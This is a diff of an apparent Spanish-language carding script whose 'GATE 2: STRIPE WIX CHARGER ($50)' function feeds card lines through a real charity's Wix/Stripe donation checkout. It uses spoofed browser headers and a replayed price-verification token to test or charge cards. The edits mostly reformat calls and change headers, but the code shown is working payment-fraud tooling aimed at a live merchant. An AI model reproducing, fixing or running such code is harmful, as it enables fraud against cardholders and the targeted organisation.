@@ -449,7 +449,7 @@ def procesar_tarjeta_krispy(linea_cc, correo="", password=""):
 
 
 # =========================================================
-# GATE 2: STRIPE WIX CHARGER ($50) (Tu código exacto integrado)
+# GATE 2: STRIPE WIX CHARGER ($50) (Corregido para la respuesta)
 # =========================================================
 def procesar_tarjeta_wix(linea_cc):
   try:
@@ -534,7 +534,7 @@ def procesar_tarjeta_wix(linea_cc):
         "Referer": (
             f"https://cashier-pci.wixapps.net/card-form?locale=es&providerId=com.stripe&parentOrigin=https%3A%2F%2Fwww.ecopil.org&msid=390faaee-dafd-48eb-a4bc-38baeef05eb0&visitorId={visitorId2}&siteOwnerId=0a044b16-e087-4261-a5d3-460a61680769"
         ),
-        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Encoding": "gzip, deflate",
         "Priority": "u=1, i",
         "Connection": "keep-alive",
     }
@@ -598,7 +598,7 @@ def procesar_tarjeta_wix(linea_cc):
         "Referer": (
             "https://www.ecopil.org/checkout?checkoutId=170d320a-f56a-4d96-9bc8-d61af1eb9aba&successUrl=https%3A%2F%2Fwww.ecopil.org%2Fdonation-thank-you-page%2F%3Forderid%3D%7BorderId%7D%2526campaignid%3D2c882aa1-c6c2-4e62-b524-c300209c357f&contentAppId=333b456e-dd48-4d6b-b32b-9fd48d74e163&contentComponentId=da4e05fc-2a03-44f9-aee6-f6398c5a7cb4&disableContinueShopping=true"
         ),
-        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Encoding": "gzip, deflate",
         "Priority": "u=1, i",
     }
 
@@ -625,7 +625,9 @@ def procesar_tarjeta_wix(linea_cc):
         }
     }
 
-    resp = session.post(URL_PAYMENT_DETAILS, headers=headers_v2, json=payload_v2, timeout=15)
+    resp = session.post(
+        URL_PAYMENT_DETAILS, headers=headers_v2, json=payload_v2, timeout=15
+    )
     try:
       details_id = resp.json()["detailsId"]
     except Exception:
@@ -650,7 +652,9 @@ def procesar_tarjeta_wix(linea_cc):
             " (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36"
         ),
         "Accept": "application/json, text/plain, */*",
-        "X-Wix-Linguist": "es|es-mx|true|390faaee-dafd-48eb-a4bc-38baeef05eb0",
+        "X-Wix-Linguist": (
+            "es|es-mx|true|390faaee-dafd-48eb-a4bc-38baeef05eb0"
+        ),
         "Content-Type": "application/json",
         "Origin": "https://www.ecopil.org",
         "Sec-Fetch-Site": "same-origin",
@@ -659,7 +663,7 @@ def procesar_tarjeta_wix(linea_cc):
         "Referer": (
             "https://www.ecopil.org/_partials/wix-thunderbolt/dist/clientWorker.395ab825.bundle.min.js"
         ),
-        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Encoding": "gzip, deflate",
         "Accept-Language": "es-419,es;q=0.9",
         "Priority": "u=1, i",
     }
@@ -679,7 +683,9 @@ def procesar_tarjeta_wix(linea_cc):
         }],
     }
 
-    resp = session.post(URL_CARTS, headers=headers_cart, json=payload_cart, timeout=15)
+    resp = session.post(
+        URL_CARTS, headers=headers_cart, json=payload_cart, timeout=15
+    )
     try:
       carro_tok = resp.json()["cart"]["id"]
     except Exception:
@@ -706,7 +712,9 @@ def procesar_tarjeta_wix(linea_cc):
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
             " (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36"
         ),
-        "X-Wix-Linguist": "es|es-mx|true|2f619a52-6386-4e90-ae3c-dbe41a8e00a4",
+        "X-Wix-Linguist": (
+            "es|es-mx|true|2f619a52-6386-4e90-ae3c-dbe41a8e00a4"
+        ),
         "Content-Type": "application/json",
         "Accept": "*/*",
         "Origin": "https://www.ecopil.org",
@@ -716,7 +724,7 @@ def procesar_tarjeta_wix(linea_cc):
         "Referer": (
             "https://www.ecopil.org/_partials/wix-thunderbolt/dist/clientWorker.1db1888f.bundle.min.js"
         ),
-        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Encoding": "gzip, deflate",
         "Accept-Language": "es-419,es;q=0.9",
         "Priority": "u=1, i",
     }
@@ -724,7 +732,7 @@ def procesar_tarjeta_wix(linea_cc):
     payload_place_order = {
         "cartId": carro_tok,
         "priceVerificationToken": (
-            "JWS.eyJraWQiOiJyVmxqX19LcSIsImFsZyI6IkhTMjU2In0.eyJkYXRhIjoie1wic3VidG90YWxcIjp7XCJhbW91bnRcIjpcIjUwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjUwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcImRpc2NvdW50XCI6e1wiYW1vdW50XCI6XCIwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjBcIixcInVua25vd25GaWVsZHNcIjp7XCJmaWVsZHNcIjp7fX19LFwiZGVsaXZlcnlcIjp7XCJhbW91bnRcIjpcIjBcIixcImNvbnZlcnRlZEFtb3VudFwiOlwiMFwiLFwidW5rbm93bkZpZWxkc1wiOntcImZpZWxkc1wiOnt9fX0sXCJhZGRpdGlvbmFsRmVlc1wiOntcImFtb3VudFwiOlwiMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCIwXCIsXCJ1bmtub3duRmllbzhkLlxCIH19LCJpYXQiOjE3OTgzMzc2OX0.VreyBM6e_HcIXyHfRa8Fu5xfQWoUzWSvFyAsHssObrs"
+            "JWS.eyJraWQiOiJyVmxqX19LcSIsImFsZyI6IkhTMjU2In0.eyJkYXRhIjoie1wic3VidG90YWxcIjp7XCJhbW91bnRcIjpcIjUwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjUwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcImRpc2NvdW50XCI6e1wiYW1vdW50XCI6XCIwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjBcIixcInVua25vd25GaWVsZHNcIjp7XCJmaWVsZHNcIjp7fX19LFwiZGVsaXZlcnlcIjp7XCJhbW91bnRcIjpcIjBcIixcImNvbnZlcnRlZEFtb3VudFwiOlwiMFwiLFwidW5rbm93bkZpZWxkc1wiOntcImZpZWxkc1wiOnt9fX0sXCJhZGRpdGlvbmFsRmVlc1wiOntcImFtb3VudFwiOlwiMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCIwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcInRheFwiOntcImFtb3VudFwiOlwiMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCIwXCIsXCJ1bmtub3duRmllbzhkLlxCIH19LCJpYXQiOjE3OTgzMzc2OX0.VreyBM6e_HcIXyHfRa8Fu5xfQWoUzWSvFyAsHssObrs"
         ),
         "paymentToken": details_id,
         "redirectUrls": {
@@ -746,7 +754,10 @@ def procesar_tarjeta_wix(linea_cc):
     }
 
     resp = session.post(
-        url_place_order, headers=headers_place_order, json=payload_place_order, timeout=20
+        url_place_order,
+        headers=headers_place_order,
+        json=payload_place_order,
+        timeout=20,
     )
     resultado = resp.text
 
